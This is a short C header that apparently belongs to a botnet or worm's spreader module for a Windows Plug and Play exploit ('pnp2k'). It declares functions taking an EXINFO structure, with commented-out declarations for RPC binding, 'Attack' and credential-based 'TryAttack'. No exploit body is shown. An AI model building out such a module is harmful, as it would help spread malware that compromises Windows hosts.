#ifndef NO_PNP2K

/*int BindRpcInterface(HANDLE PH, char *Interface, char *InterfaceVer);
int Attack(EXINFO exinfo, HANDLE PipeHandle);
BOOL TryAttack(EXINFO exinfo, char* username, char* password);*/

void convert_name(char *out, char *name);
BOOL pnp2k(EXINFO exinfo);

#endif